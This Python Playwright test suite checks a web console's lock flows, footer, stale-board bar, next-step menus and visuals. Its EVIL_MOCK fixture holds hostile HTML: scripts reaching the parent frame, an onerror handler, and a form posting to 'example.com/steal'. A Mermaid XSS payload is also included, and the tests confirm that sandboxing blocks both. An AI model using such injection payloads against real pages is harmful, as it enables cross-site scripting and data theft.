                page.evaluate("window.ConsoleKit.open('LANE.1')")
                page.click(".ck-lock-answered-open")
                page.wait_for_selector(".ck-lock-answered .ck-confirm")
                # Q2 is answered again after the owner saw it: its shown answer is no longer current.
                self.console.write("answer", {"qid": "LANE.1/Q2", "picks": ["leave"], "own_text": "",
                                              "nonce": "refusedans4"}, "owner")
                page.click(".ck-lock-answered-go")
                page.wait_for_selector(".ck-lock-answered-error", timeout=10000)
                err = page.locator(".ck-lock-answered-error").text_content()
                self.assertIn("Locked 1 of 3.", err)
                self.assertIn("LANE.1/Q2 was not locked", err)
                self.assertEqual(locks(), ["LANE.1/Q1"])  # stopped at Q2: Q3 was not tried
                self.assertTrue(page.evaluate("document.activeElement.classList.contains('ck-lock-answered-error')"))
                self.assertEqual(page.locator("[role='alert'].ck-lock-answered-error").count(), 0)
                page.click(".ck-lock-answered-error button")
                self.assertEqual(page.locator(".ck-lock-answered-error").count(), 0)
                self.assertTrue(page.evaluate("document.activeElement.classList.contains('ck-questions-heading')"))
                self.assert_not_reloaded(page)

    def test_the_usage_footer_shows_usage_and_account_and_makes_room(self):
        # Catches: a footer on a server that set no file; one drawn from anything but the checked
        # fields; one that covers the page's last line; a stale snapshot that reads as current;
        # and one that pushes a phone sideways.
        from datetime import datetime, timedelta, timezone

        def stamp(ago=timedelta(0)):
            return (datetime.now(timezone.utc) - ago).isoformat().replace("+00:00", "Z")

        def write_usage(d, ago=timedelta(0)):
            (d / "usage.json").write_text(json.dumps({
                "updated_at": stamp(ago),
                "five_hour": {"used_percentage": 42, "resets_at": stamp(-timedelta(hours=2))},
                "seven_day": {"used_percentage": 18, "resets_at": None},
                "planted": "planted-usage-marker"}))

        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                page.evaluate("window.ConsoleKit.refreshUsage()")
                from overture import __version__
                # No usage file: the footer carries the kit version alone, never usage it was not given.
                self.assertEqual(page.locator(".ck-footer").evaluate(FOOTER_TEXT), f"overture {__version__}")
                d = self.cfg.root
                write_usage(d)
                (d / "acct.json").write_text(json.dumps(
                    {"oauthAccount": {"emailAddress": "owner@example.com", "accountUuid": "planted-uuid"},
                     "primaryApiKey": "planted-secret"}))
                self.console.cfg = self.SV.Config(**{**self.cfg.__dict__, "usage_file": d / "usage.json",
                                                     "account_file": d / "acct.json"})
                page.evaluate("window.ConsoleKit.refreshUsage()")
                page.wait_for_selector(".ck-footer")
                text = page.locator(".ck-footer").text_content()
                for want in ("5-hour 42% (resets", "7-day 18%", "as of just now", "owner@example.com",
                             f"overture {__version__}"):
                    self.assertIn(want, text)
                self.assertNotIn("planted", text)
                self.assertEqual(page.locator(".ck-footer").get_attribute("data-stale"), "false")
                room = page.evaluate("[parseFloat(getComputedStyle(document.body).paddingBottom),"
                                     " document.querySelector('.ck-footer').offsetHeight]")
                self.assertAlmostEqual(room[0], room[1], delta=1)
                write_usage(d, ago=timedelta(hours=3))
                page.evaluate("window.ConsoleKit.refreshUsage()")
                self.assertIn("as of 3 h ago", page.locator(".ck-footer").text_content())
                self.assertEqual(page.locator(".ck-footer").get_attribute("data-stale"), "true")
                page.set_viewport_size({"width": 375, "height": 800})
                page.evaluate("window.ConsoleKit.refreshUsage()")
                self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), 375)
                room = page.evaluate("[parseFloat(getComputedStyle(document.body).paddingBottom),"
                                     " document.querySelector('.ck-footer').offsetHeight]")
                self.assertAlmostEqual(room[0], room[1], delta=1)
                self.assert_not_reloaded(page)

    def test_the_footer_names_the_running_kit_version_with_no_usage_at_all(self):
        # Owner, 2026-10-01: "version number should be in footer". Catches: a version shown only when the
        # usage footer is on; one typed into console.js rather than read from the server; and one put in
        # as markup.
        from overture import __version__
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                page.wait_for_selector(".ck-footer")
                self.assertEqual(page.locator(".ck-footer").evaluate(FOOTER_TEXT), f"overture {__version__}")
                # As text, never markup: the footer's one element is the Shortcuts button (#129), which opens
                # the shortcut sheet.
                self.assertEqual(page.locator(".ck-footer").evaluate(
                    "e => [...e.children].map(c => c.tagName + '.' + c.className)"), ["BUTTON.ck-footer-keys"])
                page.click(".ck-footer-keys")
                page.wait_for_selector("#ck-shortcut-help[role=dialog]", state="visible")
                room = page.evaluate("[parseFloat(getComputedStyle(document.body).paddingBottom),"
                                     " document.querySelector('.ck-footer').offsetHeight]")
                self.assertAlmostEqual(room[0], room[1], delta=1)   # it covers no line of the page
                self.assert_not_reloaded(page)

    # -- the board-stale bar (owner, 2026-10-01: "the 'board has changed since page loaded' message is not
    # going away"). The served page is a PUBLISHED SNAPSHOT (Q28/Q29), so reloading serves the same page with
    # the same shape and the bar comes straight back: it may never offer an action that cannot fix it.

    STALE_HOST = LIVE_HOST.replace("<input id=\"board-input\"",
                                   '<p data-live-shape="page-shape">Open: <span data-live="open">3</span></p>\n'
                                   '<input id="board-input"')
    MISMATCH = {"items": dict(LIVE_ITEMS), "seed_questions": [],
                "board": {"shape": "board-shape", "values": {"open": "4"}}}

    def _stale_page(self, kind, staged):
        url = self.serve(snapshot=True, page=self.STALE_HOST)
        if staged:   # the steward staged a newer page; the owner has not pressed "Use this page" yet
            from test_server import page_body
            self.console.push_page_snapshot(page_body(self.STALE_HOST.replace("page-shape", "board-shape"),
                                                      commit="beef" + "0" * 36))
        code, out = self.SV.agent_request(self.cfg.socket, "POST", "/items", self.MISMATCH)
        self.assertEqual(code, 200, out)
        page = self.page(kind, 1280, url)
        page.wait_for_selector(".ck-board-stale", timeout=10000)
        bar = page.locator(".ck-board-stale")
        self.assertEqual(bar.get_attribute("role"), "status")
        self.assertEqual(page.locator("[data-live='open']").text_content(), "3")   # nothing was patched
        self.assertEqual(page.locator(".ck-board-reload").count(), 0)   # a reload serves the same snapshot
        text = bar.text_content()
        self.assertNotIn("Reload", text)
        self.assertIn("since this page was published", text)
        self.assertIn("live numbers are paused", text)
        return page, bar, text

    def test_a_stale_board_with_nothing_staged_names_page_snapshot_and_offers_no_reload(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page, bar, text = self._stale_page(kind, staged=False)
                self.assertIn("agent.py page-snapshot", text)
                self.assertNotIn("Use this page", text)
                self.assertEqual(bar.locator("button").count(), 0)   # nothing here can fix it
                self.assert_not_reloaded(page)

    def test_a_stale_board_with_a_staged_page_points_at_use_this_page(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page, bar, text = self._stale_page(kind, staged=True)
                self.assertIn('"Use this page"', text)
                self.assertNotIn("page-snapshot", text)
                for sel in (".ck-board-stale span", ".ck-page-waiting"):   # stacked, neither covers the other
                    self.assertTrue(page.evaluate(
                        f"(() => {{ const e = document.querySelector('{sel}'), r = e.getBoundingClientRect();"
                        f" return e.contains(document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2));"
                        f" }})()"), sel)
                review = bar.locator("button")
                self.assertEqual(review.text_content(), "Review the new page")
                review.click()
                page.wait_for_selector("dialog.ck-page-dialog[open]")   # the same review dialog the chip opens
                self.assertTrue(page.evaluate("document.querySelector('dialog.ck-page-dialog').matches(':modal')"))
                self.assertTrue(page.evaluate(LiveConsoleTests.IN_DIALOG))
                page.keyboard.press("Escape")
                _wait_for(page, "!document.querySelector('dialog.ck-page-dialog').open")
                self.assertTrue(page.evaluate("document.activeElement.classList.contains('ck-board-show-proposal')"))
                self.assert_not_reloaded(page)   # reviewing the proposal publishes nothing


# -- 0.8.0: the Next step menu, tag chips, roar, and visuals, against the REAL server ------

# A mock that tries everything a hostile page would: run a script in its own document,
# reach the console through parent/top, post a message out, fire an inline handler, and
# submit a form away. In an <iframe sandbox=""> served under a `sandbox` CSP, none may work.
EVIL_MOCK = ("<!doctype html><html><head><style>h1{font:20px sans-serif}</style></head><body>"
             "<h1 id='mock'>Grid mock</h1>"
             "<script>document.body.setAttribute('data-ran','script');"
             "try{parent.document.body.setAttribute('data-pwned','parent')}catch(e){}"
             "try{top.document.title='pwned'}catch(e){}"
             "try{parent.postMessage('pwned','*')}catch(e){}</script>"
             "<img src='x' onerror=\"document.body.setAttribute('data-ran','img');parent.postMessage('img','*')\">"
             "<form action='https://example.com/steal'><button>go</button></form></body></html>")
MERMAID = 'graph TD\n  A["<img src=x onerror=alert(1)>"] --> B[Zone]\n'


class NextStepAndVisualTests(unittest.TestCase):
    """0.8.0: Next step ▾ (follow up / refine / drill), tag chips with reasons, roar once, visuals."""

    setUpClass = classmethod(LiveConsoleTests.setUpClass.__func__)
    tearDownClass = classmethod(LiveConsoleTests.tearDownClass.__func__)
    page, agent_post, bell, assert_not_reloaded = (LiveConsoleTests.page, LiveConsoleTests.agent_post,
                                                   LiveConsoleTests.bell, LiveConsoleTests.assert_not_reloaded)

    def serve(self):
        """LiveConsoleTests.serve, with a project that sets specs_dir and visuals_dir."""
        import tempfile
        from overture import server as SV
        from test_server import AUD, HOSTNAME, KEY, TEAM, page_body, token
        td = tempfile.mkdtemp(prefix="ck-p4-")
        self.addCleanup(lambda: __import__("shutil").rmtree(td, ignore_errors=True))
        root = Path(td)
        (root / "specs").mkdir()
        (root / "specs/grid.md").write_text("# Grid\n\nA session block holds the cells.\n")
        os.utime(root / "specs/grid.md", (1_600_000_000, 1_600_000_000))   # long before any lock
        (root / ".overture.json").write_text(json.dumps({"specs_dir": "specs/", "visuals_dir": "visuals/"}))
        cfg = SV.Config(root=root, page=None, state=root / "state", adapter=root / "unused.py",
                        team_domain=TEAM, aud=AUD, hostname=HOSTNAME, port=0, project="p4-test")
        console = SV.Console(cfg, _LiveAdapter())
        staged = console.push_page_snapshot(page_body(LIVE_HOST))   # Q28: the page is the steward's snapshot
        console.publish_page({"commit": staged["staged"]})   # Q29: and the owner published it
        verify = SV.access_verifier(TEAM, AUD, key_for=lambda _t: KEY.public_key())
        owner = SV.owner_server(console, verify, 0)
        threading.Thread(target=owner.serve_forever, daemon=True).start()
        agent = SV.agent_server(console)
        threading.Thread(target=agent.serve_forever, daemon=True).start()
        for srv in (owner, agent):
            self.addCleanup(srv.server_close)
            self.addCleanup(srv.shutdown)
        self.tok, self.origin = token(), f"https://{HOSTNAME}"
        self.SV, self.console, self.cfg = SV, console, cfg
        return f"http://127.0.0.1:{owner.server_address[1]}/"

    def locked_question(self, own_text="", picks=("leave",)):
        """LANE.1/Q1 citing the spec, answered against the ★ in the owner's own words, and locked."""
        self.agent_post("/question", {
            "qid": "LANE.1/Q1", "item": "LANE.1", "text": "Where does the session block live?", "kind": "single",
            "options": [{"id": "fix", "label": "Fix now"}, {"id": "record", "label": "Record in findings.md"},
                        {"id": "leave", "label": "Leave it"}],
            "star": "fix", "source": "specs/grid.md:3", "valid_if": [], "nonce": "p4question01"})
        a = self.console.write("answer", {"qid": "LANE.1/Q1", "picks": list(picks), "own_text": own_text,
                                          "nonce": "p4answer001"}, "owner")
        self.console.write("lock", {"qid": "LANE.1/Q1", "answer": a["id"], "nonce": "p4lock00001"}, "owner")

    def open_item(self, page):
        page.click("details[id='item-LANE.1'] .ck-item-btn")
        page.wait_for_selector(".ck-panel .ck-tools")

    def shot(self, page, name, kind, width):
        if os.environ.get("OVERTURE_SHOTS"):
            page.locator(".ck-panel").screenshot(
                path=str(Path(os.environ["OVERTURE_SHOTS"]) / f"{name}-{kind}-{width}.png"))

    def forks(self):
        return [r for r in self.console.store.records() if r["type"] == "message" and r.get("intent") == "fork"]

    def test_tag_chips_say_why_and_next_step_starts_a_refine(self):
        # Catches: chips worked out on the page (they would drift from the server's rules), a chip
        # whose reason a screen reader never hears, a menu that offers the step but sends a plain
        # follow-up, and a refine that forgets which answer it is about.
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    self.locked_question(own_text="Keep the `ZoneMaster` out of the grid.")
                    page = self.page(kind, width, url)
                    self.open_item(page)
                    _expand(page)
                    page.wait_for_selector(".ck-question .ck-tag[data-step='refine']")
                    chips = page.eval_on_selector_all(".ck-question .ck-tag", """cs => cs.map(c => ({
                        step: c.dataset.step, title: c.title,
                        shown: c.querySelector('[aria-hidden=true]').textContent,
                        said: c.querySelector('.ck-sr-only').textContent }))""")
                    self.assertEqual([c["step"] for c in chips], ["refine", "drill", "deliberate"])
                    for c in chips:
                        self.assertEqual(c["shown"], "→ " + c["step"])
                        self.assertTrue(c["said"].startswith(f"Suggested next step, {c['step']}: "), c)
                        self.assertTrue(c["said"].endswith(c["title"]), c)   # the reason, whole, both ways
                    self.assertIn("cites specs/grid.md, not edited since you locked this", chips[0]["title"])
                    self.assertIn("`ZoneMaster`", chips[1]["title"])
                    self.assertIn("went against the ★ (Fix now)", chips[2]["title"])
                    nxt = page.locator("button[aria-label^='Next step for']")
                    nxt.click()
                    self.assertEqual(nxt.get_attribute("aria-expanded"), "true")
                    self.assertEqual(page.eval_on_selector_all(".ck-next-menu button", "bs => bs.map(b => b.dataset.step)"),
                                     ["follow", "refine", "drill"])
                    self.assertTrue(page.evaluate("document.activeElement.dataset.step === 'follow'"))  # focus moved in
                    page.locator(".ck-next-menu button[data-step='refine']").click()
                    form = page.locator(".ck-step-form[data-step='refine']")
                    self.assertIn("It writes nothing before you lock", form.text_content())
                    form.get_by_label("Note (optional)").fill("The spec still says the block floats.")
                    self.shot(page, "next-step-refine", kind, width)
                    self.assertFalse(page.evaluate(OVERFLOW))
                    form.get_by_role("button", name="Start the refine").click()
                    _wait_for(page, "document.querySelectorAll('.ck-step-form').length === 0")
                    [f] = self.forks()
                    self.assertEqual({k: f.get(k) for k in ("intent", "step", "about_qid", "mode", "roles", "text")},
                                     {"intent": "fork", "step": "refine", "about_qid": "LANE.1/Q1", "mode": "tighten",
                                      "roles": None, "text": "The spec still says the block floats."})
                    page.wait_for_selector(".ck-fork-head:has-text('Refine')")
                    self.assert_not_reloaded(page)

    def test_a_refine_chip_in_the_server_says_which_time_it_shows(self):
        # CONSOLE-kit/Q23: the served console reads no git, so a refine chip shows the file's time
        # and says why it is not the last commit's. Catches: an unlabelled "file time" that reads
        # as if git had been asked.
        _seam_closed(self)
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.locked_question()
                page = self.page(kind, 1280, url)
                self.open_item(page)
                _expand(page)
                page.wait_for_selector(".ck-question .ck-tag[data-step='refine']")
                title = page.get_attribute(".ck-question .ck-tag[data-step='refine']", "title")
                said = page.text_content(".ck-question .ck-tag[data-step='refine'] .ck-sr-only")
                for text in (title, said):
                    self.assertIn(f"(file time 2020-09-13T12:26:40Z; the last-commit time is {NOGIT}, lock ", text)

    def test_a_second_roar_is_refused_on_the_page_naming_the_first(self):
        # Catches: a roar allowed beside other seats, and a second roar the server lets through
        # (the page would say "sent" and six agents would run again).
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    self.locked_question(picks=("fix",))
                    page = self.page(kind, width, url)
                    self.open_item(page)

                    def roar_once():
                        if page.locator(".ck-next-menu").count() == 0:
                            _expand(page)
                            page.locator("button[aria-label^='Next step for']").click()
                        page.locator(".ck-next-menu button[data-step='follow']").click()
                        form = page.locator(".ck-followup")
                        roar = form.locator("input[value='roar']")
                        roar.check()
                        self.assertTrue(form.get_by_label("DevOps").is_disabled())   # roar is called alone
                        form.get_by_role("button", name="Send follow-up").click()
                        return form

                    roar_once()
                    _wait_for(page, "document.querySelectorAll('.ck-followup').length === 0")
                    [first] = self.forks()
                    self.assertEqual(first["roles"], ["roar"])
                    form = roar_once()
                    _wait_for(page, "document.querySelector('.ck-followup .ck-error-msg').textContent !== ''")
                    err = form.locator(".ck-error-msg").text_content()
                    self.assertIn(first["id"], err)
                    self.assertIn("at most once per lock", err)
                    self.assertEqual(len(self.forks()), 1)
                    self.shot(page, "roar-refused", kind, width)
                    self.assertFalse(page.evaluate(OVERFLOW))

    def test_a_visual_renders_only_in_a_sandbox_and_its_script_cannot_reach_the_page(self):
        # Catches: a mock injected into the page (its script runs as the owner), an iframe with
        # allow-scripts or allow-same-origin (it could read the console), a mock whose script runs
        # when its URL is opened on its own, and Mermaid source parsed as markup.
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    page = self.page(kind, width, url)
                    page.evaluate("window.__msgs = []; addEventListener('message', e => __msgs.push(String(e.data)))")
                    self.open_item(page)
                    page.locator("button[aria-label='Request a visual of LANE.1']").click()
                    form = page.locator(".ck-visual-form")
                    form.get_by_label("What should it show?").fill("The grid at phone width")
                    form.get_by_role("button", name="Request the visual").click()
                    page.wait_for_selector(".ck-visual-request")
                    [req] = [r for r in self.console.store.records() if r.get("intent") == "visual"]
                    self.assertEqual(self.bell()[-1]["intent"], "visual")
                    html = self.agent_post("/visual", {"request": req["id"], "format": "html", "title": "Grid mock",
                                                       "content": EVIL_MOCK, "text": "One column per zone.",
                                                       "nonce": "p4visual001"})
                    self.agent_post("/visual", {"request": req["id"], "format": "mermaid", "title": "Zones",
                                                "content": MERMAID, "text": "Zones feed the grid.",
                                                "nonce": "p4visual002"})
                    # 0.9.0: a Mermaid visual is drawn in a frame of its own too, so every visual frame
                    # is checked: none may be same-origin, and only Mermaid's may run its vendored lib.
                    html_sel = ".ck-visual[data-format='html'] iframe.ck-visual-frame"
                    mmd_sel = ".ck-visual[data-format='mermaid'] iframe.ck-visual-frame"
                    frame_el = page.wait_for_selector(html_sel, timeout=10000)
                    self.assertEqual(frame_el.get_attribute("sandbox"), "")          # grants nothing
                    self.assertEqual(page.wait_for_selector(mmd_sel, timeout=10000).get_attribute("sandbox"),
                                     "allow-scripts")                               # scripts, never same-origin
                    sandboxes = page.locator("iframe.ck-visual-frame").evaluate_all(
                        "fs => fs.map(f => f.hasAttribute('sandbox') ? f.getAttribute('sandbox') : null)")
                    self.assertEqual(len(sandboxes), 2, sandboxes)                   # one frame per visual
                    for sb in sandboxes:
                        self.assertIsNotNone(sb, sandboxes)
                        self.assertTrue(set(sb.split()) <= {"allow-scripts"}, sandboxes)
                    frame = page.frame_locator(html_sel)
                    self.assertEqual(frame.locator("#mock").text_content(timeout=10000), "Grid mock")  # it rendered
                    mmd = page.frame_locator(mmd_sel)
                    mmd.locator(".mermaid svg").wait_for(timeout=10000)              # the diagram drew
                    self.assertEqual(mmd.locator("body").evaluate(                  # Mermaid's strict sanitiser
                        "b => [...b.querySelectorAll('*')].flatMap(e => e.getAttributeNames()"
                        ".filter(a => a.startsWith('on')))"), [])                     # left no handler to run
                    self.assertEqual(mmd.locator("body").evaluate(
                        "() => { try { return String(parent.document.body); } catch (e) { return 'blocked'; } }"),
                        "blocked")                                                  # an opaque origin
                    page.wait_for_timeout(500)                                      # time for any script to act
                    self.assertIsNone(frame.locator("body").get_attribute("data-ran"))
                    self.assertIsNone(page.evaluate("document.body.getAttribute('data-pwned')"))
                    self.assertNotEqual(page.title(), "pwned")
                    self.assertEqual(page.evaluate("window.__msgs"), [])
                    self.assertEqual(page.locator("#mock").count(), 0)            # nothing of it in the page itself
                    code = page.locator(".ck-visual[data-format='mermaid'] .ck-visual-code")
                    page.locator(".ck-visual[data-format='mermaid'] .ck-visual-source-toggle").click()  # 0.9.0
                    _wait_for(page, "document.querySelector(\".ck-visual[data-format='mermaid'] "
                                           ".ck-visual-code\").textContent.startsWith('graph TD')")
                    self.assertEqual(code.text_content(), MERMAID)                  # as text, markup and all
                    self.assertEqual(code.locator("img").count(), 0)
                    self.shot(page, "visual", kind, width)
                    self.assertFalse(page.evaluate(OVERFLOW))
                    # Opened on its own, the mock is still sandboxed by the server's CSP: no script runs.
                    alone = page.context.new_page()
                    alone.route("**/*", lambda route: route.continue_(
                        headers={**route.request.headers, "cf-access-jwt-assertion": self.tok}))
                    alone.goto(url + "api/visual?id=" + html["id"])
                    alone.wait_for_selector("#mock")
                    alone.wait_for_timeout(300)
                    self.assertIsNone(alone.locator("body").get_attribute("data-ran"))
                    self.assert_not_reloaded(page)


# A host whose own header is sticky at the top, stacked the way a lane board's is (z-index 100).
STICKY_HOST = LIVE_HOST.replace(
    "<body>", '<body><header id="host-header" style="position:sticky;top:0;z-index:100;height:64px;'
              'background:#222;color:#fff">host header</header><div style="height:2000px">')
STICKY_HOST = STICKY_HOST.replace("</body>", "</div></body>")


class InboxUXTests(unittest.TestCase):
    """Owner rulings CONSOLE-kit/Q33-Q37 (2026-10-02, all ★), and the console half of Q38's motion."""

    setUpClass = classmethod(LiveConsoleTests.setUpClass.__func__)
    tearDownClass = classmethod(LiveConsoleTests.tearDownClass.__func__)
    serve = LiveConsoleTests.serve
    agent_post = LiveConsoleTests.agent_post
    ask = LiveConsoleTests.ask
    bell = LiveConsoleTests.bell
    page = LiveConsoleTests.page
    open_inbox = LiveConsoleTests.open_inbox
    assert_not_reloaded = LiveConsoleTests.assert_not_reloaded

    # -- helpers ------------------------------------------------------------------------

    def answer(self, qid, pick="fix", own_text=""):
        return self.console.write("answer", {"qid": qid, "picks": [pick], "own_text": own_text,
                                             "nonce": "ans" + qid.replace("/", "").replace(".", "")}, "owner")

    def lock(self, qid):
        head = self.console.store.head(qid)
        return self.console.write("lock", {"qid": qid, "answer": head["id"],
                                           "nonce": "lk" + qid.replace("/", "").replace(".", "")}, "owner")

    def locked(self, qid):
        head = self.console.store.head(qid)
        return bool(head) and self.console.store.lock_of(head["id"]) is not None

    def locks(self):
        return [r for r in self.console.store.records() if r["type"] == "lock"]

    def open_item(self, page, item="LANE.1"):
        page.evaluate("ConsoleKit.open(%s)" % json.dumps(item))
        page.wait_for_selector(".ck-questions-heading")

    def said(self, page, text, timeout=3000):
        _wait_for(page, "t => document.querySelector('.ck-live').textContent.includes(t)", arg=text,
                               timeout=timeout)

    def ask_as(self, n, agent, item="LANE.1", at=None, **over):
        """An agent question asked under a session name (kit 0.8.2), at a chosen store time."""
        if at is not None:
            self.console.store.clock = lambda: at
        body = {"qid": f"{item}/Q{n}", "item": item, "text": f"Question {n}: which way?", "kind": "single",
                "options": [{"id": "fix", "label": "Fix now"}, {"id": "record", "label": "Record in findings.md"},
                            {"id": "leave", "label": "Leave it"}],
                "star": "fix", "source": "docs/spec.md:1", "valid_if": [], "nonce": f"uxq{n:04d}{agent or 'none'}"}
        body.update(over)
        return self.console.write("question", body, "agent", agent=agent)

    # -- Q33: one tap locks, at once (0.9.12 removed the countdown) ---------------------

    def test_q33_one_tap_locks_at_once_with_no_countdown_or_confirm(self):
        # 0.9.12 ("The 5-second lock countdown is gone"): Lock this answer sends at the tap.
        # Catches: a countdown or Undo left in (nothing may stand between the tap and the lock); a second
        # confirm step left in (one tap must be enough); a tap that locks twice or not at all; and focus
        # left on the Lock button the lock removed, so a keyboard owner is dropped on the board.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                self.answer("LANE.1/Q1")
                page = self.page(kind, 1280, url)
                self.open_item(page)
                self.assertEqual(self.locks(), [], "a lock reached the store before the tap")
                page.focus(".ck-lock-one")
                page.keyboard.press("Enter")
                self.said(page, "Locked.")
                self.assertTrue(self.locked("LANE.1/Q1"))
                self.assertEqual(len(self.locks()), 1)
                self.assertEqual(page.locator(".ck-confirm").count(), 0, "a second confirmation step is left in")
                self.assertEqual(page.locator(".ck-lock-countdown, .ck-lock-undo").count(), 0,
                                 "a countdown or Undo is left in")
                # Focus was on the Lock button the lock removed: it lands on the question's own line.
                page.wait_for_selector(".ck-q-line[data-qid='LANE.1/Q1']")
                self.assertTrue(page.evaluate("document.activeElement.classList.contains('ck-q-line')"))
                self.assertEqual(page.locator(".ck-lock-one").count(), 0)
                page.wait_for_timeout(1000)   # nothing deferred lands a second lock later
                self.assertEqual(len(self.locks()), 1)

    def test_q33_leaving_the_question_and_leaving_the_page_without_a_tap_send_nothing(self):
        # Catches: a lock sent without the tap (an answer is not a lock); a page that sends a lock as it
        # unloads (a beacon or fetch keepalive on pagehide, where the countdown's drop handler was); and a
        # Lock button that leaving the question or the page breaks, so the tap after it does nothing.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                self.answer("LANE.1/Q1")
                page = self.page(kind, 1280, url)
                self.open_item(page)
                # 1. Leaving the question: another item, then back.
                page.evaluate("ConsoleKit.open('LANE')")
                page.wait_for_timeout(500)
                self.open_item(page)
                # 2. Leaving the page and coming back from the back/forward cache. The page and its
                # handlers live on (navigating away for real would kill them and prove nothing).
                page.evaluate("""() => {
                    window.dispatchEvent(new PageTransitionEvent('pagehide', {persisted: true}));
                    window.dispatchEvent(new PageTransitionEvent('pageshow', {persisted: true}));
                }""")
                page.wait_for_timeout(1000)
                self.assertEqual(self.locks(), [], "a lock was sent without a tap")
                self.assertEqual(page.locator(".ck-lock-one").count(), 1)
                # 3. The Lock button still works after all that, once.
                page.click(".ck-lock-one")
                self.said(page, "Locked.")
                self.assertTrue(self.locked("LANE.1/Q1"))
                self.assertEqual(len(self.locks()), 1)

    def test_q33_hiding_the_tab_or_closing_the_panel_sends_nothing_and_keeps_a_lock_once(self):
        # Review MEDIUMs, after 0.9.12. Catches: a hidden tab or a closed panel that sends a lock the owner
        # never tapped; and a lock tapped just before the tab hides that is then lost, sent twice, or
        # reported as dropped (it already went: "you left the page before it locked" would be a lie).
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                self.ask(2)
                self.answer("LANE.1/Q1")
                self.answer("LANE.1/Q2")
                page = self.page(kind, 1280, url)
                self.open_item(page)
                hide_and_show = """() => {
                    const set = v => Object.defineProperty(document, 'visibilityState', {configurable: true, get: () => v});
                    set('hidden'); document.dispatchEvent(new Event('visibilitychange'));
                    set('visible'); document.dispatchEvent(new Event('visibilitychange'));
                }"""
                # 1. The tab is hidden (switching tabs, minimising), then shown again.
                page.evaluate(hide_and_show)
                # 2. The panel is closed, then opened again.
                page.click(".ck-close-btn")
                page.wait_for_timeout(1000)
                self.assertEqual(self.locks(), [], "hiding the tab or closing the panel sent a lock")
                self.open_item(page)
                self.assertEqual(page.locator(".ck-lock-one").count(), 2)
                # 3. A tap, then the tab hides at once: the lock already went, exactly once.
                page.locator(".ck-question[data-qid='LANE.1/Q1'] .ck-lock-one").click()
                page.evaluate(hide_and_show)
                self.said(page, "Locked.")
                page.wait_for_timeout(1000)
                self.assertTrue(self.locked("LANE.1/Q1"))
                self.assertFalse(self.locked("LANE.1/Q2"))
                self.assertEqual(len(self.locks()), 1)
                self.assertNotIn("before it locked", page.evaluate("document.querySelector('.ck-live').textContent"))

    def test_q33_a_live_redraw_after_the_lock_keeps_focus_and_the_box_being_typed_in(self):
        # Catches: focus thrown off the locked question's line by a live redraw (Enter would land somewhere
        # else), the lock undone or doubled by the redraw, and a live change (a lock landing from elsewhere)
        # redrawing a box the owner is typing in.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                self.ask(2)
                self.ask(3)
                self.answer("LANE.1/Q1")
                self.answer("LANE.1/Q3")
                page = self.page(kind, 1280, url)
                self.open_item(page)
                page.locator(".ck-question[data-qid='LANE.1/Q1'] .ck-lock-one").click()
                self.said(page, "Locked.")
                page.wait_for_selector(".ck-q-line[data-qid='LANE.1/Q1']")
                self.ask(4)   # arrives live after the lock
                page.wait_for_selector(".ck-question:has-text('Question 4')", timeout=6000)
                self.assertTrue(page.evaluate("document.activeElement.classList.contains('ck-q-line') && "
                                              "document.activeElement.dataset.qid === 'LANE.1/Q1'"))
                self.assertTrue(self.locked("LANE.1/Q1"))
                self.assertEqual(len(self.locks()), 1)
                # Now type in Q2's own-words box while a lock on Q3 lands live: the box is not redrawn under the owner.
                box = page.locator(".ck-question:has-text('Question 2') textarea").first
                box.click()
                box.type("half a thought")
                self.lock("LANE.1/Q3")
                self.ask(5)   # after the lock in the store: its "Show" note says the page has both
                page.wait_for_selector(".ck-live-note", timeout=6000)   # the change waits behind "Show"
                self.assertEqual(box.input_value(), "half a thought")
                self.assertTrue(page.evaluate("document.activeElement.tagName === 'TEXTAREA'"))
                self.assertEqual(len(self.locks()), 2)

    # -- Q37: a settled question is one line ------------------------------------------

    def test_q37_locked_questions_roll_up_to_one_line_and_open_on_click(self):
        # Catches: locked questions left at full size; an open question rolled up (it still asks something);
        # a line without the pick; an expand that a live redraw closes again; and a toggle a keyboard or
        # screen reader cannot use (a div, or no aria-expanded).
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                self.ask(2)
                self.ask(3)
                self.answer("LANE.1/Q1", pick="record")
                self.lock("LANE.1/Q1")
                self.answer("LANE.1/Q2")
                page = self.page(kind, 1280, url)
                self.open_item(page)
                line = page.locator(".ck-q-line[data-qid='LANE.1/Q1']")
                self.assertEqual(line.get_attribute("aria-expanded"), "false")
                self.assertEqual(line.evaluate("e => e.tagName"), "BUTTON")
                text = " ".join(line.text_content().split())
                for part in ("LANE.1/Q1", "Record in findings.md", "locked"):
                    self.assertIn(part, text)
                card = page.locator(".ck-question[data-qid='LANE.1/Q1']")
                self.assertEqual(card.locator(".ck-receipt").count(), 0, "a rolled-up question shows its receipt")
                for qid in ("LANE.1/Q2", "LANE.1/Q3"):   # unlocked and unanswered stay whole
                    self.assertEqual(page.locator(f".ck-question-rolled[data-qid='{qid}']").count(), 0, qid)
                line.focus()
                page.keyboard.press("Enter")
                page.wait_for_selector(".ck-question[data-qid='LANE.1/Q1'] .ck-receipt")
                self.assertEqual(page.locator(".ck-q-line[data-qid='LANE.1/Q1']").get_attribute("aria-expanded"),
                                 "true")
                self.assertTrue(page.evaluate("document.activeElement.classList.contains('ck-q-line')"))
                self.ask(4)   # a live redraw keeps it open
